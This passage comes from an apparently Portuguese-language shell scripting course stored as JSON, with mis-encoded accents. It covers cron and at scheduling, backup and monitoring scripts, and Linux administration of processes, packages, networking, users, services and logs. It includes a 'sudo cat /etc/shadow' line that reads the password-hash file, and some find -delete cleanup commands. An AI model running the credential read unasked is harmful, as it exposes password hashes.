\"$dir\" ]; then\n        nome=$(basename \"$dir\")\n        arquivo_backup=\"$BACKUP_DIR/${nome}_${HORA}.tar.gz\"\n        \n        log \"INFO\" \"Backup de: $dir\"\n        \n        # Calcular tamanho original\n        tamanho_origem=$(du -sh \"$dir\" | cut -f1)\n        \n        # Criar backup\n        inicio=$(date +%s)\n        tar -czf \"$arquivo_backup\" -C \"$(dirname \"$dir\")\" \"$nome\" 2>/dev/null\n        fim=$(date +%s)\n        \n        # Calcular estat√≠sticas\n        duracao=$((fim - inicio))\n        tamanho_backup=$(du -h \"$arquivo_backup\" | cut -f1)\n        \n        log \"INFO\" \"Conclu√≠do: $arquivo_backup ($tamanho_backup, ${duracao}s)\"\n        \n        TOTAL_ORIGEM=$((TOTAL_ORIGEM + $(du -s \"$dir\" | cut -f1)))\n        TOTAL_BACKUP=$((TOTAL_BACKUP + $(du -s \"$arquivo_backup\" | cut -f1)))\n    else\n        log \"AVISO\" \"Diret√≥rio n√£o existe: $dir\"\n    fi\ndone\n\n# Limpar backups antigos\nlog \"INFO\" \"Limpando backups com mais de $RETENCAO_DIAS dias...\"\nremovidos=$(find \"$BACKUP_BASE\" -type f -name \"*.tar.gz\" -mtime +$RETENCAO_DIAS -delete -print | wc -l)\nlog \"INFO\" \"Removidos $removidos backups antigos\"\n\n# Calcular estat√≠sticas finais\nTOTAL_ORIGEM_MB=$((TOTAL_ORIGEM / 1024))\nTOTAL_BACKUP_MB=$((TOTAL_BACKUP / 1024))\nCOMPRESSAO=$(echo \"scale=2; ($TOTAL_BACKUP_MB / $TOTAL_ORIGEM_MB) * 100\" | bc)\n\n# Gerar relat√≥rio\nRELATORIO=\"Relat√≥rio de Backup - $(date)\n\"\nRELATORIO+=\"================================\n\"\nRELATORIO+=\"Data: $(date)\n\"\nRELATORIO+=\"Diret√≥rio: $BACKUP_DIR\n\"\nRELATORIO+=\"Tamanho original: ${TOTAL_ORIGEM_MB}MB\n\"\nRELATORIO+=\"Tamanho backup: ${TOTAL_BACKUP_MB}MB\n\"\nRELATORIO+=\"Taxa de compress√£o: ${COMPRESSAO}%\n\"\nRELATORIO+=\"Backups removidos: $removidos\n\"\nRELATORIO+=\"Status: ‚úÖ Conclu√≠do com sucesso\n\"\n\n# Logar e enviar relat√≥rio\nlog \"INFO\" \"$RELATORIO\"\nenviar_relatorio \"Relat√≥rio de Backup $(date)\" \"$RELATORIO\"\n\nlog \"INFO\" \"Backup conclu√≠do com sucesso!\"\nexit 0\n```\n\n**Configura√ß√£o no cron para backup incremental:**\n```bash\n# Backup di√°rio √†s 2:00 AM\n0 2 * * * /home/usuario/scripts/backup_incremental.sh\n\n# Backup completo semanal aos domingos √†s 3:00 AM\n0 3 * * 0 /home/usuario/scripts/backup_completo.sh\n```\n\n### üìã CHECKLIST DE IMPLANTA√á√ÉO DE TAREFAS AGENDADAS\n\n1. ‚úÖ **Teste o script manualmente primeiro**\n   ```bash\n   ./meu_script.sh\n   ```\n\n2. ‚úÖ **Verifique permiss√µes de execu√ß√£o**\n   ```bash\n   chmod +x meu_script.sh\n   ```\n\n3. ‚úÖ **Configure logging adequado**\n   ```bash\n   0 2 * * * /caminho/script.sh >> /var/log/script.log 2>&1\n   ```\n\n4. ‚úÖ **Defina PATH no cron ou no script**\n   ```bash\n   PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n   ```\n\n5. ‚úÖ **Teste com ambiente m√≠nimo**\n   ```bash\n   env - /bin/bash -c '/caminho/script.sh'\n   ```\n\n6. ‚úÖ **Configure notifica√ß√µes de erro**\n   ```bash\n   MAILTO=seu@email.com\n   ```\n\n7. ‚úÖ **Monitore logs regularmente**\n   ```bash\n   tail -f /var/log/syslog | grep cron\n   ```\n\n8. ‚úÖ **Documente cada tarefa agendada**\n   ```bash\n   # Backup di√°rio - Mant√©m √∫ltimos 7 dias\n   0 2 * * * /scripts/backup.sh\n   ```",
    "examples": "```bash\n# Exemplo 1: Configura√ß√£o completa de crontab\n# ~/.crontab\nSHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nMAILTO=admin@empresa.com\n\n# Backups\n0 2 * * * /scripts/backup_diario.sh >> /var/log/backup.log 2>&1\n0 3 * * 0 /scripts/backup_completo.sh >> /var/log/backup_completo.log 2>&1\n\n# Monitoramento\n*/5 * * * * /scripts/monitor_saude.sh\n0 * * * * /scripts/verificar_disco.sh\n\n# Limpeza\n0 4 * * * /scripts/limpar_tmp.sh\n0 5 * * 0 /scripts/limpar_logs.sh\n\n# Relat√≥rios\n0 6 * * 1-5 /scripts/relatorio_diario.sh\n0 7 1 * * /scripts/relatorio_mensal.sh\n\n# Exemplo 2: Script que usa at para agendamento posterior\n#!/bin/bash\n# agendar_backup.sh\necho \"Escolha quando fazer backup:\"\necho \"1) Daqui a 1 hora\"\necho \"2) Amanh√£ √†s 2:00 AM\"\necho \"3) Pr√≥ximo domingo √†s 3:00 AM\"\nread -p \"Op√ß√£o: \" opcao\n\ncase $opcao in\n    1)\n        echo \"/scripts/backup.sh\" | at now + 1 hour\n        echo \"Backup agendado para daqui a 1 hora\"\n        ;;\n    2)\n        echo \"/scripts/backup.sh\" | at 2:00 tomorrow\n        echo \"Backup agendado para amanh√£ √†s 2:00 AM\"\n        ;;\n    3)\n        echo \"/scripts/backup.sh\" | at 3:00 sunday\n        echo \"Backup agendado para domingo √†s 3:00 AM\"\n        ;;\n    *)\n        echo \"Op√ß√£o inv√°lida\"\n        exit 1\n        ;;\nesac\n\n# Exemplo 3: Monitor de tarefas cron ativas\n#!/bin/bash\n# monitor_cron.sh\nwhile true; do\n    clear\n    echo \"=== MONITOR DE TAREFAS CRON ===\"\n    echo \"√öltima atualiza√ß√£o: $(date '+%H:%M:%S')\"\n    echo \"\"\n    \n    # Mostrar pr√≥ximas execu√ß√µes\n    echo \"Pr√≥ximas execu√ß√µes agendadas:\"\n    for usuario in $(getent passwd | cut -d: -f1); do\n        tasks=$(crontab -l -u \"$usuario\" 2>/dev/null | grep -v '^#' | wc -l)\n        if [ $tasks -gt 0 ]; then\n            echo \"$usuario: $tasks tarefas\"\n        fi\n    done\n    \n    # Mostrar logs recentes\n    echo \"\"\n    echo \"√öltimas execu√ß√µes:\"\n    sudo grep cron /var/log/syslog | tail -3 2>/dev/null || \\\n        sudo journalctl -u cron --since \"5 minutes ago\" 2>/dev/null | tail -3\n    \n    sleep 30\ndone\n\n# Exemplo 4: Sistema de notifica√ß√£o por email para falhas\n#!/bin/bash\n# notificar_falhas.sh\nLOG_DIR=\"/var/log/cron\"\nEMAIL_ADMIN=\"admin@empresa.com\"\n\n# Verificar logs dos √∫ltimos 30 minutos\nfor log_file in \"$LOG_DIR\"/*.log; do\n    if [ -f \"$log_file\" ]; then\n        # Procurar por ERRO, ERROR, FAIL, FAILED, exception (case insensitive)\n        erros=$(grep -i -E \"(erro|error|fail|exception)\" \"$log_file\" | \\\n                grep -E \"$(date -d '30 minutes ago' '+%b %e %H:')\")\n        \n        if [ -n \"$erros\" ]; then\n            assunto=\"ALERTA: Erros em $(basename \"$log_file\")\"\n            echo -e \"Log: $log_file\n\nErros encontrados:\n$erros\" | \\\n                mail -s \"$assunto\" \"$EMAIL_ADMIN\"\n            echo \"$(date) - Notifica√ß√£o enviada para $EMAIL_ADMIN\" >> /var/log/notificacoes.log\n        fi\n    fi\ndone\n\n# Configurar no cron para executar a cada 15 minutos\n# */15 * * * * /scripts/notificar_falhas.sh\n```",
    "summary": "Neste m√≥dulo voc√™ dominou a arte do agendamento autom√°tico de tarefas. Aprendeu a usar `cron` para tarefas peri√≥dicas (di√°rias, semanais, mensais) e `at` para execu√ß√µes √∫nicas. Viu como configurar scripts de backup, monitoramento e limpeza que rodam automaticamente, mesmo quando voc√™ n√£o est√° presente. Aprendeu boas pr√°ticas como configura√ß√£o adequada de PATH, logging, tratamento de erros e notifica√ß√µes. Agora voc√™ pode criar sistemas verdadeiramente aut√¥nomos que mant√™m seu ambiente funcionando 24/7 sem interven√ß√£o manual.",
    "estimated_time_minutes": "90"
  },
  {
    "id": "module_6",
    "course_id": "shell_script_completo",
    "title": "Administra√ß√£o de Sistema",
    "order": "6",
    "description": "Comandos essenciais para monitorar, gerenciar e manter sistemas Linux/Unix. Aprenda a diagnosticar problemas, gerenciar processos, monitorar recursos e configurar aspectos fundamentais do sistema.",
    "learning_objectives": [
      "Monitorar processos e recursos do sistema (CPU, mem√≥ria, disco)",
      "Gerenciar servi√ßos e processos (iniciar, parar, reiniciar)",
      "Instalar, atualizar e remover pacotes de software",
      "Configurar e diagnosticar problemas de rede",
      "Gerenciar usu√°rios, grupos e permiss√µes",
      "Analisar logs do sistema para troubleshooting",
      "Configurar tarefas de manuten√ß√£o do sistema"
    ],
    "key_concepts": [
      "Monitoramento de sistema",
      "Gerenciamento de processos",
      "Sistema de pacotes (APT, YUM, DNF)",
      "Configura√ß√£o de rede",
      "Gerenciamento de usu√°rios",
      "Logs do sistema",
      "Servi√ßos e daemons"
    ],
    "content": "## üõ†Ô∏è M√ìDULO 6: Administra√ß√£o de Sistema\n\n### üìä Monitoramento de Sistema\n\n#### üìä PROCESSOS:\n\n**Listar e gerenciar processos:**\n\n```bash\n# Listar todos os processos com detalhes\nps aux\n\n# Listar processos de forma hier√°rquica (√°rvore)\npstree\n\n# Listar processos em tempo real (atualiza automaticamente)\ntop\n\n# Vers√£o melhorada do top (se instalado)\nhtop\n\n# Listar processos de um usu√°rio espec√≠fico\nps -u usuario\n\n# Listar processos por nome\nps aux | grep nginx\n\n# Ver informa√ß√µes detalhadas de um processo\nps -fp <PID>\n```\n\n**Gerenciar processos:**\n\n```bash\n# Enviar sinal para processo (padr√£o: SIGTERM - t√©rmino gracioso)\nkill <PID>\n\n# For√ßar t√©rmino do processo (SIGKILL)\nkill -9 <PID>\n\n# Matar processo por nome\npkill nome_processo\n\n# Matar todos os processos com determinado nome\nkillall nome_processo\n\n# Pausar processo (SIGSTOP)\nkill -STOP <PID>\n\n# Continuar processo pausado (SIGCONT)\nkill -CONT <PID>\n\n# Ver sinais dispon√≠veis\nkill -l\n```\n\n**Informa√ß√µes do sistema:**\n\n```bash\n# Tempo que o sistema est√° rodando\nuptime\n\n# Informa√ß√µes do sistema operacional\nuname -a\n\n# Informa√ß√µes espec√≠ficas\nuname -r  # Vers√£o do kernel\nuname -m  # Arquitetura da m√°quina\nuname -s  # Nome do sistema operacional\n\n# Informa√ß√µes da CPU\nlscpu\ncat /proc/cpuinfo\n\n# Informa√ß√µes de mem√≥ria\ndmidecode -t memory  # Hardware de mem√≥ria\n\n# Temperatura do sistema (se dispon√≠vel)\nsensors\n```\n\n#### üíæ MEM√ìRIA E DISCO:\n\n```bash\n# Uso de mem√≥ria em formato leg√≠vel\nfree -h\n\n# Uso de mem√≥ria com atualiza√ß√µes a cada 2 segundos\nwatch -n 2 free -h\n\n# Informa√ß√µes detalhadas de mem√≥ria\nvmstat 1 5  # Estat√≠sticas a cada 1s, 5 vezes\n\n# Uso de disco em formato leg√≠vel\ndf -h\n\n# Uso de disco por filesystem espec√≠fico\ndf -h /home\n\n# Inodes dispon√≠veis (importante para sistemas com muitos arquivos pequenos)\ndf -i\n\n# Uso de disco por diret√≥rio\ndu -sh /home/*\n\n# Encontrar os 10 maiores diret√≥rios\ndu -h / | sort -rh | head -10\n\n# Uso de disco em tempo real (I/O)\niotop  # Precisa ser instalado\niostat 1 3  # Estat√≠sticas de I/O\n```\n\n#### üìà SISTEMA E UPTIME:\n\n```bash\n# Carregamento do sistema (load average)\nuptime\n# Mostra: tempo, usu√°rios logados, load average (1, 5, 15 minutos)\n\n# Load average explicado:\n# 1.00 em CPU single-core = 100% utiliza√ß√£o\n# 4.00 em CPU quad-core = 100% utiliza√ß√£o\n# Valores acima de 1.00 por n√∫cleo indicam processos esperando\n\n# Hist√≥rico de carregamento\ntop -n 1 -b | grep \"load average\"\n\n# Informa√ß√µes do kernel\ndmesg | tail -20  # √öltimas mensagens do kernel\n\n# Log do sistema\njournalctl -xe  # Logs mais recentes com detalhes\n\n# Verificar espa√ßo em swap\nswapon --show\nfree -h | grep -i swap\n\n# Verificar mounts ativos\nmount | column -t\ncat /proc/mounts\n```\n\n### üì¶ Gerenciamento de Pacotes\n\n#### üì¶ DEBIAN/UBUNTU (APT):\n\n```bash\n# Atualizar lista de pacotes dispon√≠veis\nsudo apt update\n\n# Atualizar pacotes instalados\nsudo apt upgrade\n\n# Atualizar sistema completamente (inclui atualiza√ß√µes de distribui√ß√£o)\nsudo apt dist-upgrade\n\n# Instalar pacote\nsudo apt install nome_pacote\n\n# Instalar m√∫ltiplos pacotes\nsudo apt install pacote1 pacote2 pacote3\n\n# Instalar vers√£o espec√≠fica\nsudo apt install nome_pacote=versao\n\n# Remover pacote (mant√©m configura√ß√µes)\nsudo apt remove nome_pacote\n\n# Remover completamente (inclui configura√ß√µes)\nsudo apt purge nome_pacote\n\n# Buscar pacote\napt search termo_busca\n\n# Informa√ß√µes detalhadas do pacote\napt show nome_pacote\n\n# Listar pacotes instalados\napt list --installed\n\n# Listar pacotes que podem ser atualizados\napt list --upgradable\n\n# Limpar cache de pacotes baixados\nsudo apt clean  # Remove todos os pacotes .deb\nsudo apt autoclean  # Remove apenas vers√µes antigas\n\n# Remover pacotes n√£o mais necess√°rios\nsudo apt autoremove\n\n# Reparar depend√™ncias quebradas\nsudo apt --fix-broken install\nsudo apt install -f\n\n# Instalar pacote .deb manualmente\nsudo dpkg -i pacote.deb\n\n# Reparar instala√ß√£o dpkg\nsudo dpkg --configure -a\n\n# Listar arquivos instalados por um pacote\ndpkg -L nome_pacote\n\n# Ver qual pacote instalou um arquivo\ndpkg -S /caminho/arquivo\n```\n\n#### üì¶ RHEL/CENTOS (YUM):\n\n```bash\n# Atualizar lista de pacotes\nsudo yum check-update\n\n# Atualizar todos os pacotes\nsudo yum update\n\n# Instalar pacote\nsudo yum install nome_pacote\n\n# Remover pacote\nsudo yum remove nome_pacote\n\n# Buscar pacote\nsudo yum search termo\n\n# Informa√ß√µes do pacote\nsudo yum info nome_pacote\n\n# Listar pacotes instalados\nsudo yum list installed\n\n# Limpar cache\nsudo yum clean all\n\n# Hist√≥rico de transa√ß√µes\nyum history\n\n# Desfazer transa√ß√£o\nyum history undo <ID>\n```\n\n#### üì¶ FEDORA (DNF):\n\n```bash\n# DNF √© o sucessor do YUM no Fedora\nsudo dnf update\nsudo dnf install nome_pacote\nsudo dnf remove nome_pacote\nsudo dnf search termo\nsudo dnf info nome_pacote\n\n# Recursos adicionais do DNF\ndnf autoremove  # Remove depend√™ncias n√£o utilizadas\ndnf provides /caminho/arquivo  # Qual pacote fornece o arquivo\ndnf repoquery  # Consulta avan√ßada aos reposit√≥rios\n```\n\n#### üì¶ SNAP (Sistema universal):\n\n```bash\n# Buscar aplicativos\nsnap find termo_busca\n\n# Instalar snap\nsudo snap install nome_snap\n\n# Listar snaps instalados\nsnap list\n\n# Atualizar snap\nsudo snap refresh nome_snap\n\n# Remover snap\nsudo snap remove nome_snap\n\n# Reverter para vers√£o anterior\nsudo snap revert nome_snap\n```\n\n### üåê Configura√ß√£o de Rede e Usu√°rios\n\n#### üåê REDE:\n\n**Informa√ß√µes de interface de rede:**\n\n```bash\n# Todas as interfaces (moderno)\nip addr show\n\n# Interface espec√≠fica\nip addr show eth0\n\n# Formato mais antigo (ainda √∫til)\nifconfig\n\n# Resumo r√°pido\nip -br addr show\n\n# Estat√≠sticas de interface\nip -s link show eth0\n```\n\n**Configura√ß√£o de rede:**\n\n```bash\n# Configurar IP temporariamente\nsudo ip addr add 192.168.1.100/24 dev eth0\n\n# Habilitar/desabilitar interface\nsudo ip link set eth0 up\nsudo ip link set eth0 down\n\n# Adicionar rota\nsudo ip route add 192.168.2.0/24 via 192.168.1.1\n\n# Tabela de rotas\nip route show\nroute -n\n\n# Gateway padr√£o\nip route show default\n```\n\n**Diagn√≥stico de rede:**\n\n```bash\n# Testar conectividade b√°sica\nping google.com\nping -c 4 google.com  # Apenas 4 pacotes\n\n# Testar com tamanho espec√≠fico\nping -s 1472 google.com  # Testar MTU\n\n# Rastrear rota\ntraceroute google.com\ntracepath google.com\n\n# Testar porta espec√≠fica\nnc -zv google.com 443  # Testar porta HTTPS\ntelnet google.com 80   # Testar porta HTTP\n\n# Testar DNS\nnslookup google.com\ndig google.com\n\n# Informa√ß√µes WHOIS (se instalado)\nwhois google.com\n\n# Velocidade de rede (teste de download)\nwget --output-document=/dev/null http://speedtest.wdc01.softlayer.com/downloads/test10.zip\n\n# Velocidade com curl\ncurl -o /dev/null -s -w '%{speed_download}\n' http://exemplo.com/arquivo\n```\n\n**Portas e conex√µes:**\n\n```bash\n# Portas abertas locais\nnetstat -tulpn\n\n# Vers√£o moderna do netstat\nss -tulpn\n\n# Conex√µes estabelecidas\nnetstat -tpn\nss -tn\n\n# Conex√µes por processo\nlsof -i\n\n# Conex√µes de um processo espec√≠fico\nlsof -i -p <PID>\n\n# Conex√µes em uma porta espec√≠fica\nlsof -i :80\n\n# Monitorar conex√µes em tempo real\niftop  # Mostra tr√°fego por conex√£o\nnethogs  # Mostra tr√°fego por processo\n```\n\n**Configura√ß√µes de rede avan√ßadas:**\n\n```bash\n# Configurar DNS temporariamente\necho \"nameserver 8.8.8.8\" | sudo tee /etc/resolv.conf\n\n# Configura√ß√µes de rede persistentes (Ubuntu/Debian)\nsudo nano /etc/netplan/01-netcfg.yaml\n\n# Configura√ß√µes de rede (RHEL/CentOS)\nsudo nano /etc/sysconfig/network-scripts/ifcfg-eth0\n\n# Reiniciar rede (depende da distribui√ß√£o)\nsudo systemctl restart network  # RHEL/CentOS\nsudo systemctl restart networking  # Debian/Ubuntu mais antigo\nsudo netplan apply  # Ubuntu moderno\n```\n\n#### üë• USU√ÅRIOS E GRUPOS:\n\n**Gerenciamento de usu√°rios:**\n\n```bash\n# Criar novo usu√°rio\nsudo useradd -m -s /bin/bash novo_usuario\n\n# Criar usu√°rio com grupo prim√°rio espec√≠fico\nsudo useradd -m -g grupo_primario -s /bin/bash novo_usuario\n\n# Definir senha para usu√°rio\nsudo passwd novo_usuario\n\n# Modificar usu√°rio existente\nsudo usermod -aG sudo usuario  # Adicionar ao grupo sudo\nsudo usermod -s /bin/zsh usuario  # Mudar shell\nsudo usermod -d /novo/home usuario  # Mudar diret√≥rio home\nsudo usermod -L usuario  # Bloquear conta\nsudo usermod -U usuario  # Desbloquear conta\n\n# Deletar usu√°rio\nsudo userdel usuario  # Mant√©m home\nsudo userdel -r usuario  # Remove home tamb√©m\n\n# Ver informa√ß√µes do usu√°rio\nid usuario\nfinger usuario  # Se instalado\n\n# Ver √∫ltimo login do usu√°rio\nlast usuario\n\n# Ver usu√°rios logados\nwho\nw\n```\n\n**Gerenciamento de grupos:**\n\n```bash\n# Criar novo grupo\nsudo groupadd novo_grupo\n\n# Adicionar usu√°rio a grupo\nsudo usermod -aG grupo usuario\n\n# Remover usu√°rio de grupo\nsudo gpasswd -d usuario grupo\n\n# Deletar grupo\nsudo groupdel grupo\n\n# Ver membros de grupo\ngetent group grupo\ncat /etc/group | grep grupo\n\n# Ver grupos de usu√°rio\ngroups usuario\nid -Gn usuario\n\n# Mudar grupo prim√°rio de usu√°rio\nsudo usermod -g novo_grupo_primario usuario\n```\n\n**Configura√ß√µes de usu√°rio:**\n\n```bash\n# Ver arquivo de usu√°rios\ncat /etc/passwd\n\n# Formato: username:password:UID:GID:comment:home:shell\n\n# Ver arquivo de grupos\ncat /etc/group\n\n# Formato: groupname:password:GID:members\n\n# Ver senhas criptografadas (somente root)\nsudo cat /etc/shadow\n\n# Configurar expira√ß√£o de senha\nsudo chage -l usuario  # Listar configura√ß√µes\nsudo chage -M 90 usuario  # Expirar ap√≥s 90 dias\nsudo chage -E 2024-12-31 usuario  # Expirar em data espec√≠fica\n\n# Limites de recursos (ulimit)\nulimit -a  # Ver limites atuais\n\n# Configurar limites no /etc/security/limits.conf\n# usuario soft nproc 1000\n# usuario hard nproc 2000\n```\n\n### üîß SERVI√áOS E SISTEMAS\n\n**Gerenciamento de servi√ßos (systemd):**\n\n```bash\n# Ver status de servi√ßo\nsudo systemctl status nome_servico\n\n# Iniciar servi√ßo\nsudo systemctl start nome_servico\n\n# Parar servi√ßo\nsudo systemctl stop nome_servico\n\n# Reiniciar servi√ßo\nsudo systemctl restart nome_servico\n\n# Recarregar configura√ß√£o (sem parar)\nsudo systemctl reload nome_servico\n\n# Habilitar inicializa√ß√£o autom√°tica\nsudo systemctl enable nome_servico\n\n# Desabilitar inicializa√ß√£o autom√°tica\nsudo systemctl disable nome_servico\n\n# Ver servi√ßos ativos\nsudo systemctl list-units --type=service --state=running\n\n# Ver todos os servi√ßos\nsudo systemctl list-unit-files --type=service\n\n# Ver logs de servi√ßo\nsudo journalctl -u nome_servico\nsudo journalctl -u nome_servico -f  # Seguir logs\nsudo journalctl -u nome_servico --since \"2024-01-01\" --until \"2024-01-02\"\n```\n\n**Gerenciamento de servi√ßos (SysV init - mais antigo):**\n\n```bash\n# Ainda usado em alguns sistemas\nsudo service nome_servico status\nsudo service nome_servico start\nsudo service nome_servico stop\nsudo service nome_servico restart\n\n# Configurar inicializa√ß√£o\nsudo update-rc.d nome_servico enable  # Debian\nsudo chkconfig nome_servico on  # RHEL/CentOS\n```\n\n### üìã LOGS DO SISTEMA\n\n**Principais arquivos de log:**\n\n```bash\n# Logs do sistema\n/var/log/syslog  # Debian/Ubuntu\n/var/log/messages  # RHEL/CentOS\n\n# Logs de autentica√ß√£o\n/var/log/auth.log\n/var/log/secure\n\n# Logs do kernel\n/var/log/kern.log\ndmesg\n\n# Logs de boot\n/var/log/boot.log\n\n# Logs espec√≠ficos de servi√ßos\n/var/log/nginx/\n/var/log/apache2/\n/var/log/mysql/\n```\n\n**Ferramentas de an√°lise de logs:**\n\n```bash\n# Ver logs em tempo real\ntail -f /var/log/syslog\n\n# Buscar erros\ngrep -i error /var/log/syslog\ngrep -E \"(error|fail|critical)\" /var/log/syslog\n\n# Logs das √∫ltimas horas\ngrep \"$(date -d '1 hour ago' '+%b %e %H:')\" /var/log/syslog\n\n# Analisar logs com journalctl (systemd)\nsudo journalctl -f  # Seguir todos os logs\nsudo journalctl --since \"1 hour ago\"\nsudo journalctl -p err  # Apenas erros\nsudo journalctl --disk-usage  # Uso de espa√ßo dos logs\n\n# Rota√ß√£o de logs (logrotate)\nsudo logrotate -f /etc/logrotate.conf  # For√ßar rota√ß√£o\nls /etc/logrotate.d/  # Configura√ß√µes espec√≠ficas\n```\n\n### üîß MANUTEN√á√ÉO DO SISTEMA\n\n**Tarefas de manuten√ß√£o comuns:**\n\n```bash\n# Verificar integridade do filesystem\nsudo fsck /dev/sda1\n\n# Monitorar uso de inodes\ndf -i\n\n# Limpar cache de mem√≥ria\necho 3 | sudo tee /proc/sys/vm/drop_caches\n\n# Verificar erros no disco\nsudo smartctl -a /dev/sda\n\n# Verificar setores defeituosos\nsudo badblocks -v /dev/sda\n\n# Verificar espa√ßo em /tmp\ndf -h /tmp\n\n# Limpar /tmp (cuidado!)\nsudo find /tmp -type f -atime +7 -delete\n\n# Atualizar timezone\nsudo timedatectl set-timezone America/Sao_Paulo\nsudo dpkg-reconfigure tzdata  # M√©todo alternativo\n\n# Sincronizar rel√≥gio\nsudo ntpdate pool.ntp.org\nsudo timedatectl set-ntp true  # Habilitar NTP autom√°tico\n\n# Verificar atualiza√ß√µes de seguran√ßa\nsudo apt list --upgradable | grep -i security  # Debian/Ubuntu\nsudo yum updateinfo list security  # RHEL/CentOS\n```\n\n**Scripts de manuten√ß√£o autom√°tica:**\n\n```bash\n#!/bin/bash\n# manutencao_diaria.sh\n# Script para manuten√ß√£o di√°ria do sistema\n\nLOG_FILE=\"/var/log/manutencao_$(date +%Y%m%d).log\"\n\necho \"=== MANUTEN√á√ÉO DI√ÅRIA DO SISTEMA ===\" | tee -a \"$LOG_FILE\"\necho \"Data: $(date)\" | tee -a \"$LOG_FILE\"\necho \"\" | tee -a \"$LOG_FILE\"\n\n# 1. Atualizar pacotes\necho \"1. Atualizando pacotes...\" | tee -a \"$LOG_FILE\"\nsudo apt update 2>&1 | tee -a \"$LOG_FILE\"\nsudo apt upgrade -y 2>&1 | tee -a \"$LOG_FILE\"\necho \"\" | tee -a \"$LOG_FILE\"\n\n# 2. Limpar pacotes antigos\necho \"2. Limpando pacotes antigos...\" | tee -a \"$LOG_FILE\"\nsudo apt autoremove -y 2>&1 | tee -a \"$LOG_FILE\"\nsudo apt autoclean 2>&1 | tee -a \"$LOG_FILE\"\necho \"\" | tee -a \"$LOG_FILE\"\n\n# 3. Verificar espa√ßo em disco\necho \"3. Verificando espa√ßo em disco...\" | tee -a \"$LOG_FILE\"\ndf -h 2>&1 | tee -a \"$LOG_FILE\"\necho \"\" | tee -a \"$LOG_FILE\"\n\n# 4. Verificar uso de mem√≥ria\necho \"4. Verificando uso de mem√≥ria...\" | tee -a \"$LOG_FILE\"\nfree -h 2>&1 | tee -a \"$LOG_FILE\"\necho \"\" | tee -a \"$LOG_FILE\"\n\n# 5. Verificar servi√ßos cr√≠ticos\necho \"5. Verificando servi√ßos cr√≠ticos...\" | tee -a \"$LOG_FILE\"\nfor servico in ssh nginx mysql; do\n    if systemctl is-active --quiet \"$servico\"; then\n        echo \"‚úÖ $servico est√° ativo\" | tee -a \"$LOG_FILE\"\n    else\n        echo \"‚ùå $servico est√° inativo\" | tee -a \"$LOG_FILE\"\n    fi\ndone\necho \"\" | tee -a \"$LOG_FILE\"\n\n# 6. Verificar logs de erro recentes\necho \"6. Verificando logs de erro...\" | tee -a \"$LOG_FILE\"\nsudo tail -20 /var/log/syslog | grep -i error 2>&1 | tee -a \"$LOG_FILE\"\necho \"\" | tee -a \"$LOG_FILE\"\n\necho \"Manuten√ß√£o conclu√≠da!\" | tee -a \"$LOG_FILE\"\n```\n\n### üö® DIAGN√ìSTICO DE PROBLEMAS\n\n**Checklist de troubleshooting:**\n\n```bash\n# 1. Verificar se sistema est√° respondendo\nw  # Ver carga e usu√°rios\ntop  # Ver processos\n\n# 2. Verificar rede\nping -c 2 8.8.8.8  # Testar conectividade externa\nip addr show  # Ver interfaces\n\n# 3. Verificar espa√ßo em disco\ndf -h  # Espa√ßo livre\ndf -i  # Inodes livres\n\n# 4. Verificar mem√≥ria\nfree -h  # Mem√≥ria livre\n\n# 5. Verificar logs\ntail -50 /var/log/syslog  # √öltimos logs\nsudo dmesg | tail -20  # √öltimas mensagens do kernel\n\n# 6. Verificar servi√ßos essenciais\nsystemctl list-units --failed  # Servi√ßos com falha\n\n# 7. Verificar processos problem√°ticos\nps aux --sort=-%cpu | head -10  # Top 10 processos por CPU\nps aux --sort=-%mem | head -10  # Top 10 processos por mem√≥ria\n\n# 8. Verificar temperatura (se dispon√≠vel)\nsensors  # Temperatura hardware\n```\n\n**Script de diagn√≥stico r√°pido:**\n\n```bash\n#!/bin/bash\n# diagnostico.sh - Script de diagn√≥stico r√°pido\n\necho \"=== DIAGN√ìSTICO DO SISTEMA ===\"\necho \"Data: $(date)\"\necho \"\"\n\necho \"1. CARREGAMENTO DO SISTEMA:\"\nuptime\necho \"\"\n\necho \"2. USO DE MEM√ìRIA:\"\nfree -h\necho \"\"\n\necho \"3. ESPA√áO EM DISCO:\"\ndf -h\necho \"\"\n\necho \"4. TOP 5 PROCESSOS POR CPU:\"\nps aux --sort=-%cpu | head -6\necho \"\"\n\necho \"5. TOP 5 PROCESSOS POR MEM√ìRIA:\"\nps aux --sort=-%mem | head -6\necho \"\"\n\necho \"6. SERVI√áOS COM FALHA:\"\nsystemctl list-units --state=failed\necho \"\"\n\necho \"7. √öLTIMOS ERROS NO LOG:\"\nsudo tail -10 /var/log/syslog | grep -i error\necho \"\"\n\necho \"8. CONEX√ïES DE REDE ATIVAS:\"\nss -tun | head -10\necho \"\"\n\necho \"Diagn√≥stico conclu√≠do!\"\n```",
    "examples": "```bash\n# Exemplo 1: Monitoramento completo do sistema\n#!/bin/bash\n# monitor_completo.sh\n\nwhile true; do\n    clear\n    echo \"=== MONITORAMENTO DO SISTEMA ===\"\n    echo \"√öltima atualiza√ß√£o: $(date '+%H:%M:%S')\"\n    echo \"\"\n    \n    # 1. Carga do sistema\n    echo \"1. CARGA DO SISTEMA:\"\n    echo \"   Uptime: $(uptime -p)\"\n    load=$(uptime | awk -F'load average:' '{print $2}')\n    echo \"   Load average: $load\"\n    echo \"\"\n    \n    # 2. Uso de CPU\n    echo \"2. USO DE CPU:\"\n    cpu=$(top -bn1 | grep \"Cpu(s)\" | awk '{print $2}')\n    echo \"   CPU: ${cpu}% utilizada\"\n    echo \"\"\n    \n    # 3. Mem√≥ria\n    echo \"3. MEM√ìRIA:\"\n    free -h | awk 'NR==1{print \"   \" $0} NR==2{print \"   Total: \" $2 \" Usada: \" $3 \" Livre: \" $4}' \n    echo \"\"\n    \n    # 4. Disco\n    echo \"4. DISCO:\"\n    df -h / | awk 'NR==2{print \"   /: \" $3 \" usados de \" $2 \" (\" $5 \")\"}'\n    echo \"\"\n    \n    # 5. Top processos\n    echo \"5. TOP PROCESSOS (CPU):\"\n    ps aux --sort=-%cpu | head -4 | awk '{printf \"   %-10s %-6s %s\n\", $11, $3\"%\", $1}'\n    echo \"\"\n    \n    # 6. Conex√µes de rede\n    echo \"6. CONEX√ïES ATIVAS:\"\n    ss -tun | grep ESTAB | wc -l | xargs -I {} echo \"   {} conex√µes estabelecidas\"\n    echo \"\"\n    \n    # 7. Logs recentes\n    echo \"7. √öLTIMOS LOGS:\"\n    sudo tail -2 /var/log/syslog 2>/dev/null | awk '{print \"   